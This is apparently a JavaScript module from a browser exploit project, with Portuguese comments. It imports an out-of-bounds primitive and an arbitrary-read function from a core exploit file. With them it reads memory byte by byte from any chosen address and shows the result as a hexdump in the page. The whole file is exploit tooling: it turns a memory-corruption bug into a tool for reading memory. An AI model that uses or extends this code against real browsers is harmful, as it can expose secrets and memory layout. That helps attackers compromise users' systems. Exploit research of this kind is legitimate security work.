// js/script3/testArrayBufferVictimCrash.mjs (Revisão 50 - Ferramenta de Dump de Memória)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    isOOBReady
} from '../core_exploit.mjs';

export const FNAME_MODULE_MEMORY_DUMPER_R50 = "MemoryDumper_R50_Diagnostic";

// Função para formatar uma linha do hexdump
function format_hexdump_line(address, data) {
    let hex_part = "";
    let ascii_part = "";

    for (let i = 0; i < data.length; i++) {
        let byte = data[i];
        hex_part += byte.toString(16).padStart(2, '0') + " ";
        // Substitui caracteres não imprimíveis por '.'
        ascii_part += (byte >= 32 && byte <= 126) ? String.fromCharCode(byte) : ".";
    }

    return `${address.toString(true)}: ${hex_part.padEnd(16 * 3)} |${ascii_part}|\n`;
}

export async function executeMemoryDump_R50(start_addr_str, size_str, output_element) {
    const FNAME = FNAME_MODULE_MEMORY_DUMPER_R50;
    logS3(`--- Iniciando ${FNAME} ---`, "test");
    
    output_element.textContent = "Iniciando dump...\n";

    try {
        const start_address = new AdvancedInt64(start_addr_str);
        const dump_size = parseInt(size_str, 10);

        if (isNaN(dump_size) || dump_size <= 0) {
            throw new Error("Tamanho do dump inválido.");
        }

        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Falha na inicialização do ambiente OOB.");

        logS3(`[R50] Iniciando dump de ${dump_size} bytes a partir de ${start_address.toString(true)}`, 'info');
        
        let full_dump_output = "";
        let bytes_in_line = [];

        for (let i = 0; i < dump_size; i++) {
            const current_address = start_address.add(i);
            
            // Tenta ler um byte de cada vez
            try {
                const byte = await arb_read(current_address, 1, 0);
                bytes_in_line.push(byte);
            } catch (e) {
                // Se a leitura falhar (memória não mapeada), preenche com '??'
                bytes_in_line.push(null); 
            }

            // Formata e exibe a cada 16 bytes
            if (bytes_in_line.length === 16) {
                const line_address = start_address.add(i - 15);
                const data_line = bytes_in_line.map(b => b === null ? 0x3F : b); // Substitui falhas por '?'
                full_dump_output += format_hexdump_line(line_address, data_line);
                bytes_in_line = [];

                // Atualiza a UI em lotes para não congelar o navegador
                if (i % 256 === 15) { 
                    output_element.textContent = full_dump_output;
                    await PAUSE_S3(0); // Cede controle para a UI renderizar
                }
            }
        }
        
        // Exibe quaisquer bytes restantes
        if (bytes_in_line.length > 0) {
            const line_address = start_address.add(dump_size - bytes_in_line.length);
            const data_line = bytes_in_line.map(b => b === null ? 0x3F : b);
            full_dump_output += format_hexdump_line(line_address, data_line);
        }
        
        output_element.textContent = full_dump_output;
        logS3(`[R50] Dump concluído.`, 'good');

    } catch (e) {
        const errorMsg = `[${FNAME}] ERRO: ${e.message}`;
        logS3(errorMsg, "critical");
        output_element.textContent += `\n\nERRO: ${e.message}`;
        console.error(e);
    }
}
